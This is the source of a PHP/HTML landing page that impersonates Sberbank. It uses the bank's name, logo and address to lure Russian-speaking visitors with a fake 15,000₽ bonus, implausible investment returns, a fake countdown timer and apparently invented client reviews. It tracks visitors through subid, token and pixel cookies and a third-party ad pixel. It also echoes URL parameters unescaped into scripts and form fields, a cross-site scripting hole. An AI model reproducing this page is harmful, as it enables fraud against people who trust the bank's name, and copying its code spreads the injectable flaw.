<?php
if (!isset($rawClick) && !isset($click)) {
  die();
}
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Сбер Банк</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap"
      rel="stylesheet"
    />
    <link rel="stylesheet" href="./styles.css" />
    <link
      rel="shortcut icon"
      href="./img/icons/favicon.svg"
      type="image/x-icon"
    />
    <script src="jquery-3.6.1.min.js"></script>

    <script>
      window.bgdataLayer = window.bgdataLayer || [];

      function bge() {
          bgdataLayer.push(arguments);
      }
      bge('init', '<?= $_GET['bge'] ?>');
    </script>
    <script
      async
      src="https://api.imotech.video/ad/events.js?pixel_id=<?= $_GET['bge'] ?>"
    ></script>

    <script type="application/javascript">
      function getCookie(name) {
        var v = document.cookie.match("(^|;) ?" + name + "=([^;]*)(;|$)");
        return v ? v[2] : null;
      }

      function setCookie(name, value, days) {
        var d = new Date();
        d.setTime(d.getTime() + 24 * 60 * 60 * 1000 * days);
        document.cookie =
          name + "=" + value + ";path=/;expires=" + d.toGMTString();
      }

      function getSubId() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{subid}".match("{")) {
          return "{subid}";
        }
        var clientSubid =
          '<?php echo isset($client) ? $client->getSubid() : "" ?>';
        if (!clientSubid.match(">")) {
          return clientSubid;
        }
        if (params.get("_subid")) {
          return params.get("_subid");
        }
        if (params.get("subid")) {
          return params.get("subid");
        }
        if (getCookie("subid")) {
          return getCookie("subid");
        }
      }

      function getToken() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{token}".match("{")) {
          return "{token}";
        }
        var clientToken =
          '<?php echo isset($client) ? $client->getToken() : "" ?>';
        if (!clientToken.match(">")) {
          return clientToken;
        }
        if (params.get("_token")) {
          return params.get("_token");
        }
        if (params.get("token")) {
          return params.get("token");
        }
        if (getCookie("token")) {
          return getCookie("token");
        }
        return null;
      }

      function getPixel() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{pixel}".match("{")) {
          return "{pixel}";
        }
        if (params.get("pixel")) {
          return params.get("pixel");
        }

        if (getCookie("pixel")) {
          return getCookie("pixel");
        }

        return null;
      }

      if (typeof URLSearchParams === "function") {
        document.addEventListener("DOMContentLoaded", function (event) {
          var params = new URLSearchParams(document.location.search.substr(1));
          var subid = getSubId();
          var token = getToken();
          var pixel = getPixel();

          params.set("_token", token);
          setCookie("pixel", pixel);
          setCookie("token", token);
          setCookie("subid", subid);
        });
      }
    </script>
  </head>
  <body>
    <header class="header">
      <div class="header__logo">
        <img src="./img/icons/logo.svg" alt="Logo" class="header__logo-img" />
      </div>
    </header>
    <main class="main">
      <section class="main__section main__section--hero">
        <h1 class="main__section-hero-heading">
          Бонус <span class="accent">15 000₽</span> на твой счет за регистрацию
          <span class="accent">прямо сейчас</span>
        </h1>
        <div class="main__section-hero-content">
          <div class="main__section-hero-video">
            <video
              src="./video/-5959-4b4a-a3c1-c12dc754fc29.mov"
              id="video"
              autoplay
              muted
              controls
            ></video>
          </div>
          <div class="main__section-hero-form">
            <form
              class="form _main-form contact-form freg thin rounded"
              id="main-form"
              method="post"
            >
              <div class="text-block-6 main__section-form-header">
                <h2 style="text-align: center">
                  Заполняйте форму и примите участие
                </h2>
              </div>
              <div class="main__section-form-content">
                <div class="timer">
                  <span>Времени осталось</span>
                  <div class="timer__digits">
                    <div class="timer__digit" id="hour1">0</div>
                    <div class="timer__digit" id="hour2">3</div>
                    <div class="timer__separator">:</div>
                    <div class="timer__digit" id="minute1">5</div>
                    <div class="timer__digit" id="minute2">1</div>
                    <div class="timer__separator">:</div>
                    <div class="timer__digit" id="second1">3</div>
                    <div class="timer__digit" id="second2">7</div>
                  </div>
                </div>
              </div>
              <input type="hidden" id="utm_medium" value='<?= $_GET['utm_medium'] ?>'>
              <input type="hidden" id="campaing_id" value='<?= $_GET['campaing_id'] ?>'>
              <input type="hidden" id="slug" value='<?= $_GET['slug'] ?>'>
              <input type="hidden" id="bge" value='<?= $_GET['bge'] ?>'> <input
              type="hidden" id="source" value='<?= $_GET['source'] ?>'>
            </form>
          </div>
        </div>
      </section>
      <section class="main__section main__section--features">
        <h2 class="main__section-features-heading">
          Стань частью команды инвесторов! Минимальные вложения, максимальный
          доход
        </h2>
        <div class="main__section-features-wrapper">
          <div class="main__section-features-items">
            <div class="main__section-features-item">
              <p>
                <span class="heading">Гибкость:</span> Возможность выйти из
                инвестиций в любой момент
              </p>
              <img src="./img/earn.png" alt="Flexible" />
            </div>
            <div class="main__section-features-item">
              <p>
                <span class="heading">Прозрачность:</span> Удобный интерфейс для
                контроля доходов
              </p>
              <img src="./img/second.png" alt="Transparent" />
            </div>
            <div class="main__section-features-item">
              <p>
                <span class="heading">Надёжность:</span> Поддержка ведущих
                аналитиков
              </p>
              <img src="./img/safe.png" alt="Safe" />
            </div>
            <div class="main__section-features-item">
              <p><span class="heading">Простота:</span> Минимальные вложения</p>
              <img src="./img/simple.png" alt="Simple" id="simple" />
            </div>
          </div>
          <div class="main__section-features-subheading">
            <h2>
              <span>Стань частью команды инвесторов!</span> Минимальные
              вложения, максимальный доход
            </h2>
          </div>
          <div class="main__section-profit">
            <div class="main__section-profit-left">
              <h3>Рассчитайте вашу прибыль</h3>
              <div class="main__section-profit-inputs">
                <div class="main__section-profit-input">
                  <label for="sum">Сумма вклада, ₽</label>
                  <input
                    type="number"
                    id="sum"
                    name="sum"
                    min="10000"
                    max="1000000"
                    value="10000"
                  />
                  <span>от 10 000 ₽</span>
                </div>
                <div class="main__section-profit-input">
                  <label for="time">Срок вклада</label>
                  <select name="time" id="time">
                    <option value="1">1 месяц</option>
                    <option value="3">3 месяцa</option>
                    <option value="6">6 месяцев</option>
                    <option value="12">12 месяцев</option>
                  </select>
                </div>
              </div>
            </div>
            <div class="main__section-profit-right">
              <div class="main__section-profit-info">
                <span>Ваш доход:</span>
                <span class="main__section-profit-sum" id="profit"
                  >40000 ₽</span
                >
              </div>
              <a href="#form" class="main__section-profit-button"
                >Получить консультацию</a
              >
            </div>
          </div>
        </div>
      </section>
      <section class="main__section main__section--reviews">
        <h3>Отзывы наших клиентов:</h3>
        <div class="main__section-reviews-wrapper">
          <div class="main__section-review">
            <img src="./img/w1.png" alt="client" />
            <div class="main__section-review-info">
              <span>Наталия Иванова</span>
              <p>
                СберИнвестиции стали для меня отличным инструментом для начала
                работы с финансами. Всё просто и понятно, интерфейс удобный, а
                аналитика помогает принимать решения. Уже через пару месяцев
                увидела первые результаты. Очень довольна!
              </p>
            </div>
          </div>
          <div class="main__section-review">
            <img src="./img/m1.png" alt="client" />
            <div class="main__section-review-info">
              <span>Дмитрий Олександрович</span>
              <p>
                Это находка! Все интуитивно понятное, даже для новичков. Легко
                открывать сделки и отслеживать свои вложения. За пару месяцев я
                уже получил неплохую прибыль и начинаю уверенно разбираться в
                рынке.
              </p>
            </div>
          </div>
          <div class="main__section-review">
            <img src="./img/w2.png" alt="client" />
            <div class="main__section-review-info">
              <span>Анастасия Казимировна</span>
              <p>
                Это мой первый опыт в мире инвестиций. Начала с небольшой суммы,
                чтобы понять, как это работает. Сервис помогает разобраться даже
                новичку. Теперь я уверенно управляю своими вложениями!
              </p>
            </div>
          </div>
          <div class="main__section-review">
            <img src="./img/m2.png" alt="client" />
            <div class="main__section-review-info">
              <span>Сергей Владимирович</span>
              <p>
                Отличный сервис, помогли мне навести порядок в финансах и начать
                инвестировать осознанно. Однозначно рекомендую для всех, кто
                хочет попробовать свои силы в инвестициях!
              </p>
            </div>
          </div>
        </div>
      </section>
    </main>
    <footer class="footer">
      <div class="footer__logo-top">
        <img src="./img/icons/logo.svg" alt="logo" />
      </div>
      <div class="footer__menu">
        <ul class="footer__menu-list">
          <li class="footer__menu-item">
            <a href="#form">Ваша безопасность</a>
          </li>
          <li class="footer__menu-item"><a href="#form">О банке</a></li>
          <li class="footer__menu-item">
            <a href="#form">Связаться с банком</a>
          </li>
          <li class="footer__menu-item">
            <a href="#form">Вопросы и ответы</a>
          </li>
          <li class="footer__menu-item">
            <a href="#form">Политика обработки данных</a>
          </li>
        </ul>
      </div>
      <div class="footer__logo">
        <img src="./img/icons/logo.svg" alt="logo" />
      </div>
      <div class="footer__info">
        <p class="footer__address">
          Россия, Москва, 117997, ул. Вавилова, 19<br />
          © 1997—2024 ПАО Сбербанк.
        </p>
        <div class="footer__socials">
          <img src="./img/icons/vk.svg" alt="vk" />
          <img src="./img/icons/ok.svg" alt="ok" />
          <img src="./img/icons/tg.svg" alt="tg" />
        </div>
      </div>
    </footer>

    <script src="loadAssets.js?v=3444371"></script>

    <script>
      window.onload = function () {
        var thx = localStorage.getItem("thanks");
        if (thx && thx === "true") {
          const fileThx = "thanks-page.php";
          window.location.href = `${fileThx}${window.location.search}`;
        }
      };

      window.onpageshow = function () {
        var thx = localStorage.getItem("thanks");
        if (thx && thx === "true") {
          const fileThx = "thanks-page.php";
          window.location.href = `${fileThx}${window.location.search}`;
        }
      };
    </script>

    <script type="application/javascript">
      function getSubId() {
        if (!"{subid}".match("{")) {
          localStorage.setItem("subid", "{subid}");
          return "{subid}";
        }
      }
      getSubId();
    </script>
  </body>
  <script type="module" src="./main.js"></script>
</html>
